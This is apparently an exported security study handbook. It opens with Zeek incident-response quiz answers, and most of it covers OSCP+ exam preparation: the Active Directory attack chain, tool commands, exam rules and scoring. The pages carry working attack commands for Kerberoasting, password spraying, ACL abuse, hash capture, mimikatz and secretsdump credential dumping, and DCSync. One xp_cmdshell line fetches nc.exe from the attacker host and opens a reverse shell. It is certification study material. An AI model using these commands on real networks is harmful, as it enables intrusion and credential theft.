Community ID is computed from the 5-tuple only (addresses, ports, protocol), not time, so when the same 5-tuple is used several times, different connections share a value (the [Caution] in section 8.2). The same source port may have been reused later, or it may be UDP traffic repeated on the same port pair for a long time. Compare Zeek's ts and duration with each result's start and end times to choose one, and match sizes (orig_bytes, resp_bytes) too. If the other two are repeated traffic between the same PC and server, that itself may be a clue such as beaconing (lesson 2.4).

Question 7. (Common misconception) "jq is slow, so for big logs just use grep." Refute this with section 6's experiment and explanation.

Answer and explanation

grep is fast (about 4.4 times in the experiment) but doesn't know about fields. It matches "beacon.example.org" even when it's in answers (another name's CNAME target) rather than query, and conditions such as numeric comparisons (bytes > 1 MB) or "records lacking this field" are hard to express. So use grep to narrow candidates broadly, then jq's select() to filter precisely. Conversely, with complex conditions and small data, jq alone is fine. Weighing accuracy against processing time is the investigator's judgement.

Question 8. (Application) During an incident, you learn that the attacker's tool adds X-Session-Token: followed by 32 hex digits to its HTTP requests. Design a way to find this tool's traces in the last three months of pcaps with Zeek.

Answer and explanation

For example: ① write a signature with http-request-header /X-Session-Token: [0-9a-f]{32}/ (same format as section 7.1), plus ip-proto == tcp and so on as needed; ② re-run three months of pcaps with -C, this signature (-s) and an investigation policy (JSON, Community ID); ③ use signatures.log's uid to link http.log (which host, uri, user_agent), conn.log (volume, duration) and files.log (files exchanged); ④ scope by the list of internal addresses that matched; ⑤ treat the first match as a candidate start of the incident timeline. Over HTTPS the header isn't visible, so look separately for features visible outside the encryption, such as the tool's TLS fingerprint (JA4 etc.), server names or beaconing patterns.

Question 9. (Interpretation) The access log shows "POST /upload HTTP/1.1" 200 0, but for the same time Zeek's http.log has that request's status_code empty and conn.log shows resp_bytes 0. Which do you believe?

Answer and explanation

Neither is simply "wrong"; they observe from different places. The server log says the server program "recorded the outcome as 200"; Zeek saw that no response bytes went out on the network (the pattern seen directly in section 4's [Caution], where the client got "Empty reply"). The client probably received no response, while the server may well have received the request body and processed something. For an upload investigation, what matters is whether the file ended up on the server, so check the server's file system, application logs and error logs, and use Zeek's request_body_len and files.log (orig_fuids) for the amount actually sent and its hash. Record the discrepancy itself in the report.

docs.title: OSCP+
docs.text:
Exam: OffSec PEN-200 → OSCP / OSCP+ · Status: Preparing · Last updated: 2026-11-05

What this section is

Study hub for the OSCP+ exam (PEN-200). The layout follows what 2025–2026 pass and fail write-ups agree on: get the Active Directory set solid, and hold the standalone machines with strong fundamentals. Where a technique already has a page in this handbook, the OSCP page links to it instead of repeating it — so the attacker view here and the detection view in Adversary / Windows / Network stay connected.

Before the exam: check the official OSCP+ Exam Guide

Exam rules — banned tools, the Metasploit limit, proof requirements, report format — change over time. Before you sit the exam, read the current OffSec OSCP+ Exam Guide yourself. The rule notes in this section are a study aid, not the authority.

Restricted in the exam (summary)

  • Automatic exploitation tools — sqlmap, SQLninja, db_autopwn, browser_autopwn → do SQLi by hand (Manual SQLi).
  • Mass vulnerability scanners — Nessus, OpenVAS, NeXpose, Core Impact → nmap -sV / NSE + searchsploit (Recon).
  • Commercial tools — Burp Suite Pro, Metasploit Pro → Burp Community, manual testing.
  • Spoofing — ARP / DNS / NBNS / LLMNR poisoning (Responder poisoning, mitm6, bettercap) → coercion to your own SMB server.
  • AI / chatbots — ChatGPT, Claude, Gemini, OffSec KAI and the like → your own notes and public references.
  • Metasploit / Meterpreter — one target only, no pivoting with it; msfvenom and multi/handler (non-Meterpreter) are fine everywhere (Shells).

Details: Exam format › Restricted · Metasploit.

  • Exam workflow

docs.title: Active Directory
docs.text:
Exam weight: 40 / 100 (10 + 10 + 20) · Priority: Highest · Last updated: 2026-11-03

In one sentence

The AD set starts from a supplied domain user (assumed breach) and chains through two machines to the Domain Controller. Partial points count, but most passing write-ups clear all 40 — and the usual blocker is not a missing technique but a missed credential or a missed pivot.

Practical companion

For command selection, output interpretation and failure diagnosis, use the practical field guide; for Windows/AD protocol detail, use the Impacket handbook.

docs.title: The AD loop
docs.text:
Every AD set is the same loop, repeated until the DC falls:

flowchart LR
    A[Credentials] --> B[Enumerate<br/>who can log in where?]
    B --> C[Attack path<br/>roast, spray, ACL, admin access]
    C --> D[Access a host]
    D --> E[Loot the host<br/>hashes, secrets, files]
    E --> A
    D -.->|new subnet| F[Pivot]
    F --> B

A typical exam-style chain (yours will differ in the details):

Step From → to Usual technique 1 Given user → MS01 (external) WinRM / RDP login, then local privesc 2 MS01 SYSTEM → domain credential mimikatz / secretsdump, files, history 3 Kali → internal subnet ligolo-ng agent on MS01 4 Domain cred → MS02 Kerberoast / reuse / ACL abuse → WinRM / psexec / MSSQL 5 MS02 loot → Domain Admin or DCSync rights Cached creds, service account, ACL path 6 → DC01 DCSync → psexec / evil-winrm as Administrator

The habit that saves the most time

Every new credential gets tried everywhere — every host, every protocol (SMB, WinRM, RDP, MSSQL), as a domain user and as a local account (--local-auth). Keep a running creds.txt and add to it the moment you find anything.

docs.title: 2. Main tools
docs.text:
Tool Use it for Runs from NetExec (nxc) Validate creds, find admin access (Pwn3d!), users, shares, policy, roasting, spraying, command exec Kali Impacket GetUserSPNs, GetNPUsers, secretsdump, psexec / wmiexec / smbexec, mssqlclient, getTGT, smbserver Kali evil-winrm Interactive PowerShell over WinRM (5985/5986), upload / download Kali BloodHound CE + SharpHound / bloodhound-ce-python Map attack paths (sessions, admin rights, ACLs) Collector on target / Kali → GUI on Kali Kerbrute User enumeration and spraying over Kerberos Kali Rubeus Kerberoast, AS-REP roast, ask / pass tickets from Windows Target mimikatz LSASS creds, SAM, LSA secrets, DCSync, pass-the-hash Target (admin) PowerView LDAP enumeration in PowerShell (users, SPNs, ACLs) Target hashcat / john Cracking roasted / captured hashes → Password attacks Kali

Exam rules that bite in the AD set

  • No spoofing / poisoning: Responder in poisoning mode (LLMNR / NBT-NS / mDNS), mitm6, ARP / DNS spoofing (bettercap, arpspoof) — all banned. Use coercion without spoofing instead.
  • Metasploit on one target only, and no Metasploit pivoting — so the AD chain is done with Impacket, NetExec, Rubeus, mimikatz, ligolo-ng. See Metasploit limits.
  • No AI / chatbots for help while you work — your notes and public references only.
  • Full list → Exam format › Restricted.

docs.title: 3.1 Assumed-breach start — map the credential
docs.text:
Situation: The control panel gives you eric.wallows : EricLikesRunning800 and the IP of MS01.

# names first — Kerberos needs them
nxc smb 192.168.120.0/24                         # discover names / domain from banners
echo "$DC dc01.$DOMAIN dc01 $DOMAIN" | sudo tee -a /etc/hosts
# optionally make the DC your resolver for Kerberos tools: add "nameserver $DC" to /etc/resolv.conf

# where does the credential work?
for p in smb winrm rdp mssql ldap; do nxc $p <MS01_IP> -u "$USER_" -p "$PASS"; done

What to read: [+] = valid; (Pwn3d!) on SMB / WinRM = admin / can execute. WinRM [+] without Pwn3d! on older NetExec still often means you can log in — try evil-winrm.

Next: log in (3.2), then on the host:

whoami /all; hostname; ipconfig /all     # privileges, groups, second NIC?
net user /domain; net group "Domain Admins" /domain

Not admin → Windows privesc. Second NIC → Pivoting.

docs.title: 3.2 evil-winrm — interactive shell with creds or a hash
docs.text:
evil-winrm -i <IP> -u "$USER_" -p "$PASS"
evil-winrm -i <IP> -u Administrator -H <NT_HASH>                  # pass-the-hash
evil-winrm -i <IP> -u "$USER_" -p "$PASS" -s ~/exam/tools/ps     # load local .ps1 scripts by name

*Evil-WinRM* PS> upload /home/kali/exam/tools/winPEASx64.exe C:\Windows\Temp\wp.exe
*Evil-WinRM* PS> download C:\Windows\Temp\sam.save

What to read: the prompt appears → you're in. WinRMAuthorizationError → valid creds but not in Remote Management Users / admins on that host; try RDP / SMB / MSSQL.

docs.title: 3.3 NetExec — domain enumeration with a user
docs.text:
nxc smb $DC -u "$USER_" -p "$PASS" --pass-pol           # lockout threshold!
nxc smb $DC -u "$USER_" -p "$PASS" --users | tee loot/users.raw
nxc smb $DC -u "$USER_" -p "$PASS" --groups
nxc smb 10.10.120.0/24 -u "$USER_" -p "$PASS" --shares
nxc smb $DC -u "$USER_" -p "$PASS" -M spider_plus        # index every readable share
nxc ldap $DC -u "$USER_" -p "$PASS" --kerberoasting kerb.hash
nxc ldap $DC -u "$USER_" -p "$PASS" --asreproast asrep.hash
nxc ldap $DC -u "$USER_" -p "$PASS" -M get-desc-users    # passwords left in descriptions
nxc smb 10.10.120.0/24 -u "$USER_" -p "$PASS" --loggedon-users

What to read: user descriptions (pwd: ...), SYSVOL / NETLOGON scripts, non-default shares (Backups, IT, Dev), kerberoast / AS-REP output files not empty.

Next: build users.txt (awk the usernames out), crack any roast hashes, grep the spider output for configs.

docs.title: 3.4 BloodHound CE — find the attack path
docs.text:
Situation: You have a valid domain user. You want to know who can reach what.

From Kali (bloodhound-ce-python)From a domain host (SharpHound) 
# pip install bloodhound-ce   (CE-compatible fork of bloodhound-python)
bloodhound-ce-python -u "$USER_" -p "$PASS" -d $DOMAIN -ns $DC -c All --zip

.\SharpHound.exe -c All --zipfilename loot.zip
# PowerShell version: Import-Module .\SharpHound.ps1; Invoke-BloodHound -c All

Start BloodHound CE on Kali (Docker, via bloodhound-cli or the project's compose file), log in at http://localhost:8080, and upload the ZIP.

Queries, in this order:

  1. Search your user → mark as Owned.
  2. Outbound Object Control on your user (GenericAll / GenericWrite / WriteDACL / WriteOwner / ForceChangePassword / AddMember).
  3. Cypher / pre-built: Kerberoastable users, AS-REP roastable users.
  4. Shortest paths from Owned objects and Shortest paths to Domain Admins.
  5. For each computer: Local Admin Rights / CanPSRemote / CanRDP / SQLAdmin edges.

What to read: an edge from something you own to something you don't. Right-click the edge → Help / Abuse explains the attack.

Collector and GUI must match

BloodHound CE needs a CE collector (SharpHound v2+, bloodhound-ce-python); the legacy 4.x GUI needs the legacy collector. A mismatch imports nothing. Decide which you use before exam day and test it.

docs.title: 3.5 Kerberoasting — Impacket / Rubeus
docs.text:
Situation: BloodHound or nxc --kerberoasting lists users with an SPN (svc_sql, svc_web).

Kali — ImpacketWindows — Rubeus 
impacket-GetUserSPNs "$DOMAIN/$USER_:$PASS" -dc-ip $DC                    # list
impacket-GetUserSPNs "$DOMAIN/$USER_:$PASS" -dc-ip $DC -request -outputfile kerb.hash

.\Rubeus.exe kerberoast /outfile:kerb.hash /nowrap

hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt      # $krb5tgs$23$

What to read: $krb5tgs$23$*svc_sql$CORP.LOCAL$.... KRB_AP_ERR_SKEW → clock skew: sudo ntpdate $DC (or faketime).

Next: cracked service account → spray it (nxc smb/winrm/mssql) — service accounts are often admin on the server they run on.

Full lab walkthrough → Lab: Kerberoasting · Defender view → Kerberoasting.

docs.title: 3.6 AS-REP roasting — Impacket / Rubeus
docs.text:
Situation: Users with Do not require Kerberos pre-authentication — works even without a password if you know the usernames.

impacket-GetNPUsers "$DOMAIN/" -usersfile users.txt -dc-ip $DC -no-pass -format hashcat -outputfile asrep.hash
impacket-GetNPUsers "$DOMAIN/$USER_:$PASS" -dc-ip $DC -request -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash /nowrap

Defender view → AS-REP Roasting.

docs.title: 3.7 Password spraying — Kerbrute / NetExec
docs.text:
Read the policy, then one password at a time:

nxc smb $DC -u "$USER_" -p "$PASS" --pass-pol
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt "$PASS"          # given password reused?
nxc smb $DC -u users.txt -p 'Spring2026!' --continue-on-success

Candidates: the given password, every cracked password, Season+Year!, Company123!, the username. Details and lockout math → Password attacks › Spraying.

docs.title: 3.8 ACL abuse — what to do with a BloodHound edge
docs.text:
Edge (your user → target) Abuse from Kali ForceChangePassword on a user net rpc password 'target' 'NewPass123!' -U "$DOMAIN/$USER_%$PASS" -S $DC GenericWrite / GenericAll on a user Targeted Kerberoast: set an SPN, roast, remove — targetedKerberoast.py -d $DOMAIN -u "$USER_" -p "$PASS" --dc-ip $DC GenericAll on a user Reset the password (as above) AddMember / GenericAll on a group net rpc group addmem 'IT Admins' "$USER_" -U "$DOMAIN/$USER_%$PASS" -S $DC WriteDACL on the domain Grant yourself DCSync rights (impacket-dacledit -action write -rights DCSync ...), then DCSync WriteOwner Take ownership (impacket-owneredit), then grant GenericAll ReadGMSAPassword / ReadLAPSPassword nxc ldap $DC -u "$USER_" -p "$PASS" --gmsa / -M laps

From Windows the same actions exist in PowerView (Set-DomainUserPassword, Add-DomainGroupMember, Set-DomainObject).

Next: after a group change, get a fresh logon (new shell / new ticket) — group membership is read at logon time.

docs.title: 3.9 Coercion without spoofing — capturing NetNTLMv2
docs.text:
Situation: You want a user's or service's NetNTLMv2 hash, but Responder-style poisoning is banned.

Run an SMB server you control and make the target connect to it:

impacket-smbserver share /tmp/share -smb2support       # prints captured NetNTLMv2 hashes

Ways to make the target connect:

  • MSSQL: EXEC master..xp_dirtree '\\<KALI>\share'; (from impacket-mssqlclient) → the SQL service account's hash.
  • Writable share someone browses: drop a .url / .lnk / .library-ms whose icon path is \\<KALI>\share\x.ico.
  • Web app / LFI on Windows: a path parameter pointing at \\<KALI>\share\x.
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt

Exam rule

Listening for connections you caused is fine. Poisoning name resolution (LLMNR / NBT-NS / mDNS / DHCPv6) so victims connect to you by mistake is spoofing and banned. Relaying (ntlmrelayx) is a grey area tied to how the connection was triggered — check the current Exam Guide before relying on it. Defender view → LLMNR / NTLM Relay.

docs.title: 3.10 Lateral movement
docs.text:
Pick the method by what you hold and which ports are open:

You have Port Command Lands as Admin password / hash 445 impacket-psexec "$DOMAIN/admin:Pass@<IP>" or -hashes :<NT> SYSTEM (noisy: creates a service) Admin password / hash 135 + 445 impacket-wmiexec "$DOMAIN/admin@<IP>" -hashes :<NT> The user (semi-interactive) Admin password / hash 445 impacket-smbexec ... / nxc smb <IP> ... -x 'whoami' SYSTEM Remote Management Users / admin 5985 evil-winrm -i <IP> -u user -H <NT> The user RDP rights 3389 xfreerdp3 /v:<IP> /u:user /p:'Pass' /d:$DOMAIN The user (GUI) SQL login 1433 impacket-mssqlclient "$DOMAIN/user:Pass@<IP>" -windows-auth SQL service account Only Kerberos works / NTLM blocked 88 impacket-getTGT "$DOMAIN/user" -hashes :<NT> → export KRB5CCNAME=user.ccache → impacket-psexec -k -no-pass "$DOMAIN/user@ms02.$DOMAIN" —

MSSQL → command execution:

SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
SQL> xp_cmdshell powershell -c "iwr http://<KALI>/nc.exe -o C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe <KALI> 443 -e cmd"

The SQL service account usually has SeImpersonatePrivilege → potato.

What to read: [*] Found writable share ADMIN$ → psexec works. rpc_s_access_denied → not admin; try WinRM / RDP / MSSQL with the same creds. With Kerberos, always use the hostname, not the IP.

Defender view → Pass-the-Hash · PsExec / SMB · WMI / WinRM · RDP.

docs.title: 3.11 Loot each machine — mimikatz / secretsdump
docs.text: As soon as you are admin / SYSTEM on a host — before moving on — collect credentials.

docs.title: mimikatz (on the target)
docs.text:
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit" > C:\Windows\Temp\mk.txt

What to read: sekurlsa::logonpasswords → Username / Domain / NTLM for every logged-on user (sometimes Password in clear text via wdigest or service accounts); lsadump::secrets → _SC_<service> = service account passwords in clear text; lsadump::cache → DCC2 hashes (-m 2100, slow); lsadump::sam → local Administrator NT hash.

docs.title: secretsdump (from Kali)
docs.text:
impacket-secretsdump "$DOMAIN/admin:Pass@<IP>"                 # SAM + LSA secrets + cached creds remotely
impacket-secretsdump -hashes :<NT> "./Administrator@<IP>"      # local admin hash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

docs.title: By hand
docs.text:
cmdkey /list
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-ChildItem C:\Users -Include *.txt,*.ps1,*.xml,*.config,*.kdbx -Recurse -ErrorAction SilentlyContinue

Next: add every hash / password to creds.txt and go back to spraying across the internal subnet.

Defender view → LSASS Dumping · SAM / NTDS Extraction.

docs.title: 3.12 Domain compromise
docs.text:
Situation: You hold a Domain Admin credential, or a user with Replicating Directory Changes (All) (BloodHound edge DCSync).

# DCSync from Kali
impacket-secretsdump "$DOMAIN/da_user:Pass@dc01.$DOMAIN" -just-dc-user Administrator
impacket-secretsdump "$DOMAIN/da_user:Pass@dc01.$DOMAIN" -just-dc-ntlm      # every user
# shell on the DC
impacket-psexec -hashes :<ADMIN_NT> "$DOMAIN/Administrator@dc01.$DOMAIN"
evil-winrm -i $DC -u Administrator -H <ADMIN_NT>

# DCSync from a Windows host as the privileged user
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" "exit"

What to read: Administrator:500:aad3b...:<NT>:::. Next: shell on the DC, type C:\Users\Administrator\Desktop\proof.txt, whoami, ipconfig → screenshot.

Other domain-level paths to study (each has a defender page): DCSync · Golden & Silver Tickets · AD CS Abuse · delegation (constrained / unconstrained / RBCD) · writable GPOs.

docs.title: 4. Common mistakes
docs.text:
• No AD methodology — the #1 first-attempt failure in write-ups. Drill the loop until it is automatic.
  • Not trying creds everywhere — especially --local-auth and MSSQL.
  • Missing /etc/hosts or clock sync → Kerberos tools fail with KDC_ERR_S_PRINCIPAL_UNKNOWN / KRB_AP_ERR_SKEW.
  • Spraying without reading the lockout policy.
  • Moving on without looting — the next credential is usually on the host you just owned.
  • Pivoting stall — owning MS01 but never routing to MS02's subnet → Pivoting.
  • BloodHound collector / GUI mismatch → empty graph.
  • Doing the AD set tired. It is 40 chained points — take it while fresh.

docs.title: 5. Exam tips
docs.text:
• Partial points count: MS01 = 10, MS02 = 10, DC = 20. Submit each flag as soon as you have it.
  • Keep one notes page per host with: how you got in, creds found there, screenshots.
  • Re-run BloodHound collection after you own a new user — new edges appear.
  • If the set stalls for ~2 hours with no new information, switch to a standalone and come back fresh (Exam format › Scoring strategy).

docs.title: Exam-Day Strategy
docs.text:
Window: 23 h 45 m hands-on + 24 h report · Sources checked / Last updated: 2026-11-04

In one sentence

Warm up on one standalone, work on the AD set while still fresh, document objectives as you complete them, and rest before frustration compounds into paralysis.

How this page is organised

A plan for the day plus a raw-point and evidence tracker to copy into your notes. The exam has a large psychological component — managing energy and nerves is as important as technique.

Check the exam start time — scoring changes on 1 December 2026

Attempts starting before 1 December 2026 at 08:00 GMT require at least 70 raw points. Attempts starting on or after that instant require at least 400 scaled points on a 100–500 scale. Under scaled scoring, 70 or 80 raw points does not guarantee a pass, and 400/500 does not mean 80% raw points. Check your booked start time; no exam date is assumed here. See scoring details and the official Scoring FAQ.

docs.title: Before the exam
docs.text:
• Book early. Slots are limited — often a month out. Pick a start time, and avoid travelling right before.
  • Choose a start time deliberately. Your sharpest hours should overlap the first ~6 h (one standalone + the AD set). Many pick mid-morning; some prefer a night start after a nap. Not so early you're groggy, not so late burnout hits at the hard part.
  • Prepare the environment the day before: Kali VM snapshot, tools / wordlists / scripts in place, the report template open, a second internet option (phone hotspot), backup power.

docs.title: Start and proctoring
docs.text:
• Setup (ID check, screen share, webcam, VPN) can take up to an hour and does not eat your 23 h 45 m — but the VPN can be slow, so don't panic.
  • The proctor may ask you to re-share your screen or recheck the webcam during the exam. This is normal; stay calm and carry on.
  • No AI, no outside help, webcam on the whole time → exam rules.

docs.title: Order of attack
docs.text:
1. One standalone to warm up (~2–3 h cap). Get into the flow — full enumeration, exploit, document. If it's fighting you, document any foothold and move on.
  2. The AD set, while fresh. 40 chained points; a missed credential or pivot early blocks the rest, so do it with a clear head → Active Directory.
  3. Back to the remaining standalones with AD banked, fresh eyes on anything you parked.
  4. Keep completing and documenting objectives. Under scaled scoring there is no published raw-point pass target. Use remaining time on promising leads, evidence checks and rest; an estimated total is not a reason to stop. For pre-change attempts, the 70-point combinations apply only if OffSec accepts the evidence; extra raw points never replace valid documentation.

docs.title: Time-boxing and breaks
docs.text:
• Give each stuck lead a fixed budget; when it expires, switch targets.
  • Take real breaks — eat lightly (heavy meals make you sluggish), step away, hydrate. Breakthroughs famously come after a break.
  • Get up roughly once an hour. The 23 h 45 m includes sleep — a short nap can be worth more than another hour of staring.

docs.title: Raw-point and evidence tracker
docs.text:
Copy this into your exam notes and keep it live. Use the control panel's objectives and raw-point values; your own total is only an estimate until grading, and cannot predict a scaled-scoring result.

Target local.txt proof.txt Est. raw points Evidence / panel / notes Time done Standalone 1 Standalone 2 Standalone 3 AD #1 — AD #2 — AD DC — Total

At the halfway mark, use the scoring strategy to review unfinished objectives, missing evidence, promising leads and energy. Do not convert this tracker to a scaled score or label it a pass/fail result.

docs.title: When stuck
docs.text:
• Go back to enumeration — the thing you need is usually already on screen, unread.
  • Switch to another machine; a parked problem often solves itself after time away.
  • Re-read your own notes for a credential or detail you noted but didn't use.
  • Don't spiral. People who pass write "I came back and got it in 20 minutes"; people who fail write "my mind went blank." The machines don't change — you do.

docs.title: After the hands-on window
docs.text:
• Submit every flag in the control panel before the VPN closes.
  • Rest, then write the report in the 24-hour window → Reporting. If your notes are good, this is mostly assembly.
  • Submit the report even if your estimated raw points seem low. Under scaled scoring, raw points alone cannot tell you whether you passed; without a submitted report, you cannot pass.
  • You cannot return to the machines, so a missing screenshot is unrecoverable — check the report against the submission checklist.
  • Allow up to 15 business days for results by email after report submission, as stated in the Scoring FAQ (previously 10; the Exam Guide's Results section still lists 10).

docs.title: Exam Format & Scoring
docs.text:
Section: OSCP+ · Sources: OffSec OSCP+ Exam Guide & Scoring FAQ (checked 2026-11-04) · Last updated: 2026-11-04

In one sentence

23 h 45 m of hands-on hacking in a private VPN, then 24 h to upload the report; 100 raw points available, with the pass mark determined by the exam start time — and a flag only counts if the report proves it was taken from an interactive shell.

Rules change — re-read before booking

Check the official OSCP+ Exam Guide and Equated Scaled Scoring FAQ again the week before the exam. The scoring method depends on when each attempt starts, not when it is booked. Check your booked start time; this page does not assume which method applies to you.

docs.title: Exam at a glance
docs.text: Item Value Hands-on window 23 h 45 m (e.g. start 09:00, VPN closes 08:45 next day) Report window 24 h after the hands-on window ends Machines 3 standalone + 1 Active Directory set of 3 machines Raw points available 100 Pass mark — starts before 1 Dec 2026, 08:00 GMT At least 70 raw points Pass mark — starts on or after 1 Dec 2026, 08:00 GMT At least 400 scaled points on a 100–500 scale Bonus points None (removed 1 Nov 2024) Connection Kali Linux + OpenVPN (OffSec only supports this setup) Proctoring Webcam + screen sharing for the whole hands-on window Results By email after report submission: allow up to 15 business days under the Scoring FAQ (previously 10; the Exam Guide's Results section still says 10)

docs.title: Where the points come from
docs.text:
Target Raw points How Standalone 1 / 2 / 3 20 each 10 for local.txt (low-privilege user) + 10 for proof.txt (root / Administrator) AD machine #1 10 Full compromise of the first host AD machine #2 10 Full compromise of the second host AD machine #3 (Domain Controller) 20 Domain compromise

For the AD set you are given a username and password at the start, simulating a user whose account has already been phished ("assumed breach"). The exact objectives for each machine are shown in the exam control panel — read them at the start.

docs.title: Scoring change from 1 December 2026
docs.text:
For attempts starting on or after 1 December 2026 at 08:00 GMT, OffSec converts the awarded raw points to an equated scaled score. The conversion accounts for the difficulty of the exam set; the raw points needed to reach 400 can be above or below 70 and are not published.

400/500 does not mean 80% raw points. There is no fixed conversion ratio or raw-point total you can use to determine whether you passed. For example, 40 AD + 30 standalone = 70 raw points, but that arithmetic does not establish a scaled score or a pass under the new method.

The exam structure, objective raw-point values, proof requirements, time limits and report deadline stay the same. Graders assess the documented objectives first; scaling happens afterwards. Submit the report even if your estimated raw total seems low. The FAQ says successful candidates receive a pass notification; unsuccessful candidates receive their scaled score.

docs.title: What makes a flag count
docs.text:
Getting the flag is not enough. Each one must meet all of these, or the target can score zero:

  1. Interactive shell. Read the flag with cat (Linux) or type (Windows) from an interactive shell on the target. Web shells are not valid — a flag read through a web shell earns zero points for that target.
  2. Original location. Read it where it lives — don't copy or move it first.
  3. Screenshot with the IP. The same screenshot must show the flag contents and the target's IP address (ip addr, ifconfig or ipconfig).
  4. Right privilege for proof.txt. Linux: a root shell. Windows: a shell as SYSTEM, Administrator, or a user in the local Administrators group.
  5. Submitted in the control panel before the exam ends. The panel does not tell you whether the flag is correct.
  6. Documented in the report well enough that a technically competent reader can repeat every step.

A proof screenshot that satisfies rules 1–4 in one frame:

LinuxWindows 
hostname; whoami; ip addr show | grep 'inet '; cat /root/proof.txt
Example output (illustrative)
web01
root
    inet 127.0.0.1/8 scope host lo
    inet 192.168.120.45/24 brd 192.168.120.255 scope global ens160
3f1c0e9b6a2d47c58e1f0a9d2b7c4e61

hostname & whoami & ipconfig | findstr IPv4 & type C:\Users\Administrator\Desktop\proof.txt
Example output (illustrative)
MS01
nt authority\system
   IPv4 Address. . . . . . . . . . . : 10.10.120.141
9a4e2c71d0b84f6e93c5a1f7e2d6b083

Grading order

OffSec grades machines in the order they appear in your report. Put each target in its own clearly labelled section.

docs.title: Passing combinations — before the scoring change only
docs.text:
Only for exams starting before 1 December 2026 at 08:00 GMT

This entire section uses the fixed 70-raw-point pass mark. These combinations and the table below are not pass guarantees under scaled scoring. All objectives must still be properly evidenced and awarded by OffSec.

Each line totals exactly 70 raw points under the unchanged objective values:

  • 40 AD + 3 × local.txt
  • 40 AD + 2 × local.txt + 1 × proof.txt
  • 20 AD + 3 × local.txt + 2 × proof.txt
  • 10 AD + 3 fully completed standalones

Under that fixed pass mark, the AD contribution determines the standalone points needed:

AD points Standalone points needed What that means 40 30 Three footholds, or one full box + one foothold 20 50 Five of the six standalone flags 10 60 Every standalone flag — no mistakes allowed 0 — Cannot pass (standalones max out at 60)

docs.title: What changed in November 2024
docs.text:
Before 1 Nov 2024 OSCP+ exam now AD set start Had to find the initial foothold yourself — no foothold, no AD points Assumed breach: domain credentials given at the start AD scoring All-or-nothing 40 Points per machine: 10 / 10 / 20 Bonus points Up to 10 for lab reports and exercises None Buffer overflow The dedicated 25-point BOF machine already ended in 2022 Still not guaranteed — at most one step of a machine Certification OSCP (lifetime) OSCP (lifetime) and OSCP+ (3 years)

OSCP+ is kept current by passing the OSCP+ recertification exam in the six months before it expires, passing another qualifying OffSec certification, or through OffSec's CPE programme. The plain OSCP never expires.

docs.title: Restricted tools and techniques
docs.text:
The guide lists these as not allowed (quoted):

Spoofing (IP, ARP, DNS, NBNS, etc)

Commercial tools or services (Metasploit Pro, Burp Pro, etc.)

Automatic exploitation tools (e.g. db_autopwn, browser_autopwn, SQLmap, SQLninja etc.)

Mass vulnerability scanners (e.g. Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.)

AI Chatbots (OffSec KAI, ChatGPT, YouChat, etc.)

Features in other tools that utilize either forbidden or restricted exam limitations

Tools that do the same job as anything on the list are also out. What this means in practice:

Want to… Not allowed Use instead Capture NetNTLMv2 hashes LLMNR / NBNS poisoning with Responder (spoofing) Make the target connect to you — impacket-smbserver, a UNC path in a file or input field Exploit SQL injection sqlmap Manual injection → Web & initial access Intercept web traffic Burp Pro Burp Suite Community, browser dev tools Get help ChatGPT, Claude, Gemini, OffSec KAI, other people Your notes, HackTricks, GTFOBins, LOLBAS, man pages, search engines

Explicitly allowed examples from the guide: Nmap (including NSE), Nikto, Burp Free, DirBuster. Searching the internet and Discord is fine; asking anyone for help is not.

docs.title: Metasploit — one target only
docs.text:
• Metasploit modules (auxiliary, exploit, post) or a Meterpreter payload may be used against one target of your choice.
  • Once used on a target, the choice is locked — even if it fails, you cannot move Metasploit to another machine.
  • Running check (or anything else) against several machines to "pick" one is not allowed.
  • No Metasploit pivoting (that would touch more than one target).
  • Always allowed on every target: msfvenom and exploit/multi/handler (with a non-Meterpreter payload).
  • The same limits apply to anything built on Metasploit (Armitage, Cobalt Strike, Metasploit Community).

docs.title: Exploit code in the report
docs.text:
• Unmodified public exploit: give the URL only — don't paste the code.
  • Modified exploit: include the modified code, the original URL, the shellcode / msfvenom command if any, and highlight and explain every change.

docs.title: Other rules
docs.text:
• Don't download files from the exam network unless you need them to compromise a target, and delete them afterwards.
  • Machine reverts are limited (the count is in the control panel). A revert wipes everything on that machine, including your shells.
  • The 23 h 45 m includes all breaks, meals and sleep — there is no pause button. Tell the proctor in chat before stepping away.
  • Have a backup plan for your own failures: second internet connection (phone hotspot), a spare Kali VM snapshot.

docs.title: Ways to lose a target's points
docs.text:
From the guide, you get zero points for a target if you:

  • use a restricted tool or technique on it;
  • use Metasploit modules or Meterpreter on more than one machine;
  • don't provide local.txt / proof.txt both in the control panel and in an interactive-shell screenshot;
  • don't document it well enough to reproduce.

docs.title: Report submission (summary)
docs.text:
Details and checklist on the Reporting page.

Item Requirement Format One PDF, inside a .7z archive; scripts / PoCs as text inside the PDF Names (case-sensitive) OSCP-OS-XXXXX-Exam-Report.pdf and OSCP-OS-XXXXX-Exam-Report.7z (your OSID) Password None on the PDF or the archive Size Max 200 MB Where / when https://upload.offsec.com, within 24 h of the hands-on window ending Check Compare the MD5 shown after upload with your local file, then click Submit File

docs.title: Scoring strategy
docs.text:
Plan around completed, documented objectives and available time. Identify the applicable scoring method from your exam start time using the overview; under scaled scoring, neither 70 nor 80 raw points is a guaranteed pass or a stopping rule.

  1. Warm up on one standalone (time-box about 2–3 h). Get into a working rhythm and document each completed objective as you go.
  2. Move to the AD set while still fresh. It is the largest single block of points and it is chained — every credential found matters for the next machine.
  3. Go back to the remaining standalones and reassess parked leads. Raw-point values help track progress, but only documented objectives earn credit.
  4. Complete as many objectives as you can while protecting evidence and rest. Reserve time to verify screenshots, control-panel submissions and reproducible notes. Do not stop because an estimated total looks sufficient.

